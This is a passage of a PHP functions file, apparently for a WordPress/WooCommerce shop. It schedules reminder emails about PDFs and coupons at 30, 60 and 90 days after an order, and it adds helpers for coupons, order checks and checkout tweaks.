	$smart_coupon_codes = get_coupons_from_email();
	echo var_dump(array_unique($smart_coupon_codes));
}


function periodic_email( ) {

    $completed_orders_30 = get_delayed_orders(30);

    if ( sizeof($completed_orders_30) > 0 ) {

        foreach ( $completed_orders_30 as $order_id ) {
					if( check_order_has_pdf($order_id) ) {
								$order = wc_get_order( $order_id );
								$email = $order->billing_email;
								$client_name = $order->billing_first_name;

								$orderObject = wc_get_order( $order_id ); // get Order object by order id
								$orderNote = __("Enviado e-mail lembrando dos 30 dias do PDF para o e-mail"); // add note text
								$orderObject->add_order_note( $orderNote, $is_customer_note = 0, $added_by_user = false);
								send_30_days_email($email, $client_name);
					}
        }
    }

    $completed_orders_60 = get_delayed_orders(60);

    if ( sizeof($completed_orders_60) > 0 ) {

        foreach ( $completed_orders_60 as $order_id ) {
					$order = wc_get_order( $order_id );
					$email = $order->billing_email;
					if( check_order_has_pdf($order_id) ) {
							$client_name = $order->billing_first_name;

							$orderObject = wc_get_order( $order_id ); // get Order object by order id
							$orderNote = __("Enviado e-mail lembrando do último dia do PDF para o e-mail"); // add note text
							$orderObject->add_order_note( $orderNote, $is_customer_note = 0, $added_by_user = false);
							send_60_days_email($email, $client_name);
					}

					if( !empty(get_coupons_from_email($email)) ) {
						$client_name = $order->billing_first_name;

						$orderObject = wc_get_order( $order_id ); // get Order object by order id
						$orderNote = __("Enviado e-mail lembrando dos 60 dias do cupom para o e-mail"); // add note text
						$orderObject->add_order_note( $orderNote, $is_customer_note = 0, $added_by_user = false);
						sendOrderCoupon60Days($email, $client_name, get_coupons_from_email($email)[0]);
					}

        }
    }

		$completed_orders_88 = get_delayed_orders(90);

		if ( sizeof($completed_orders_88) > 0 ) {

        foreach ( $completed_orders_88 as $order_id ) {
					$order = wc_get_order( $order_id );
					$email = $order->billing_email;
					if( !empty(get_coupons_from_email($email)) ) {
								$client_name = $order->billing_first_name;

								$orderObject = wc_get_order( $order_id ); // get Order object by order id
								$orderNote = __("Enviado e-mail lembrando dos 88 dias do cupom para o e-mail"); // add note text
								$orderObject->add_order_note( $orderNote, $is_customer_note = 0, $added_by_user = false);
								sendOrderCoupon90Days($email, $client_name, get_coupons_from_email($email)[0]);
					}
        }
    }
    
}

function get_delayed_orders($delay) {
    $one_day    = 24 * 60 * 60;
    $final_delay = $one_day * $delay;
    $today      = strtotime( date('Y-m-d') );


    $orders = wc_get_orders(array(
        'limit'=>-1,
        'type'=> 'shop_order',
        'status'=> array( 'wc-completed'),
        'date_modified'=> date('Y-m-d', ($today - $final_delay)),
        'return' =>  'ids'
        )
    );

    return $orders;
}

add_action( 'wp', 'schedule_cron_job_event' );
function schedule_cron_job_event() {

    if ( ! wp_next_scheduled( 'periodict_email_action' ) ) {
        wp_schedule_event( time(), 'daily', 'periodict_email_action' );
    }

}
add_action('periodict_email_action', 'periodic_email');

if( wp_next_scheduled( 'email_remeber_pdf_action' ) ) {
	wp_clear_scheduled_hook('email_remeber_pdf_action');
}

function get_coupons_from_email( $current_email ) {
    global $wpdb;

    return $wpdb->get_col( $wpdb->prepare("
        SELECT p.post_name
        FROM {$wpdb->prefix}posts p
        INNER JOIN {$wpdb->prefix}postmeta pm
            ON p.ID = pm.post_id
        INNER JOIN {$wpdb->prefix}postmeta pm2
            ON p.ID = pm2.post_id
        WHERE p.post_type = 'shop_coupon'
            AND p.post_status = 'publish'
            AND pm2.meta_key = 'customer_email'
            AND pm2.meta_value LIKE '%s'
        ORDER BY p.post_name DESC
    ", $current_email ) );
}


function createCustomCoupon($coupon_code, $amount, $email = '', $expiry_date = '') {
		$discount_type = 'fixed_cart'; // Type: fixed_cart, percent, fixed_product, percent_product

		$coupon = array(
		'post_title' => $coupon_code,
		'post_content' => '',
		'post_status' => 'publish',
		'post_author' => 1,
		'post_type' => 'shop_coupon');

		$new_coupon_id = wp_insert_post( $coupon );

		// Add meta
		update_post_meta( $new_coupon_id, 'discount_type', $discount_type );
		update_post_meta( $new_coupon_id, 'coupon_amount', $amount );
		update_post_meta( $new_coupon_id, 'individual_use', 'yes' );
		update_post_meta( $new_coupon_id, 'product_ids', '' );
		update_post_meta( $new_coupon_id, 'exclude_product_ids', '' );
		update_post_meta( $new_coupon_id, 'usage_limit', '1' );
		update_post_meta( $new_coupon_id, 'expiry_date', $expiry_date );
		update_post_meta( $new_coupon_id, 'apply_before_tax', 'yes' );
		update_post_meta( $new_coupon_id, 'free_shipping', 'no' );
		update_post_meta( $new_coupon_id, 'customer_email', $email );  
}

function generateRandomString($length = 10) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function check_order_has_pdf( $order_id ) {
  $order = wc_get_order( $order_id );
  $items = $order->get_items();
  foreach ( $items as $item_id => $item ) {
     $product_id = $item->get_variation_id() ? $item->get_variation_id() : $item->get_product_id();
		 $terms = get_post_meta( $product_id, 'custom_product_type' );
		 if($terms[0] === 'pdf') {
         return true;
     }
  }
  return false;
}

function check_order_has_pendant( $order_id ) {
  $order = wc_get_order( $order_id );
  $items = $order->get_items();
  foreach ( $items as $item_id => $item ) {
     $product_id = $item->get_variation_id() ? $item->get_variation_id() : $item->get_product_id();
     $terms = get_post_meta( $product_id, 'custom_product_type' );
		 if($terms[0] === 'pingente') {
         return true;
     }
  }
  return false;
}

function check_order_spotify($order_id) {
	$order = wc_get_order( $order_id );
  $items = $order->get_items();
	$has_spotify = false;
	foreach ( $items as $item_id => $item ) {
		foreach ( $item->get_formatted_meta_data() as $meta_id => $meta ) {
			$display_pdf_value = wp_strip_all_tags( $meta->display_value );
			if($meta->display_key === 'QR Code Spotify') {
				$has_spotify = true;
			}
		}
	}

	return $has_spotify;
}

add_filter( 'woocommerce_add_to_cart_redirect', 'mdmdc_add_to_cart_redirect' );
function mdmdc_add_to_cart_redirect() {

	global $woocommerce;
	$cart_quantity = $woocommerce->cart->cart_contents_count;

	wc_clear_notices();
	if($cart_quantity == 1) {
		// wp_redirect( wc_get_checkout_url(), 302 );
		return $woocommerce->cart->get_checkout_url();
	} else {
		// wp_redirect( wc_get_cart_url(), 302 );
		return $woocommerce->cart->get_cart_url();
	}
	
}

update_option( 'woocommerce_cart_redirect_after_add', 'no' );
update_option( 'woocommerce_enable_ajax_add_to_cart', 'no' );

function order_items_shipping_info($order) {
	$order_pdf_item_qty = 0;

	foreach ( $order->get_items() as $item_id => $item ) {
		$name = $item->get_name();

		if(strpos($name, 'PDF')) {
			$order_pdf_item_qty++;
		}
	}

	if ($order_pdf_item_qty > 0) {
		return true;
	} else {
		return false;
	}
}

add_action( 'wp_enqueue_scripts', 'dequeue_woocommerce_styles_scripts', 99 );

function dequeue_woocommerce_styles_scripts() {
    if ( function_exists( 'is_woocommerce' ) ) {
        if ( ! is_woocommerce() && ! is_cart() && ! is_checkout() ) {
            # Styles
            wp_dequeue_style( 'woocommerce-general' );
            wp_dequeue_style( 'woocommerce-layout' );
            wp_dequeue_style( 'woocommerce-smallscreen' );
            wp_dequeue_style( 'woocommerce_frontend_styles' );
            wp_dequeue_style( 'woocommerce_fancybox_styles' );
            wp_dequeue_style( 'woocommerce_chosen_styles' );
            wp_dequeue_style( 'woocommerce_prettyPhoto_css' );
            # Scripts
            wp_dequeue_script( 'wc_price_slider' );
            wp_dequeue_script( 'wc-single-product' );
            wp_dequeue_script( 'wc-add-to-cart' );
            wp_dequeue_script( 'wc-cart-fragments' );
            wp_dequeue_script( 'wc-checkout' );
            wp_dequeue_script( 'wc-add-to-cart-variation' );
            wp_dequeue_script( 'wc-single-product' );
            wp_dequeue_script( 'wc-cart' );
            wp_dequeue_script( 'wc-chosen' );
            wp_dequeue_script( 'woocommerce' );
            wp_dequeue_script( 'prettyPhoto' );
            wp_dequeue_script( 'prettyPhoto-init' );
            wp_dequeue_script( 'jquery-blockui' );
            wp_dequeue_script( 'jquery-placeholder' );
            wp_dequeue_script( 'fancybox' );
            wp_dequeue_script( 'jqueryui' );
        }
    }
}

function valid_order_status($status) {
  if($status === 'failed' ) {
    return false;
  }

  if($status === 'cancelled' ) {
    return false;
  }

  if($status === 'refunded' ) {
    return false;
  }

  return true;
}

// Remove Order Notes Field
add_filter( 'woocommerce_checkout_fields' , 'remove_order_notes' );

function remove_order_notes( $fields ) {
     unset($fields['order']['order_comments']);
     return $fields;
}

function getUserIp() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
      return $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      return $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
      return $ip = $_SERVER['REMOTE_ADDR'];
  }
}

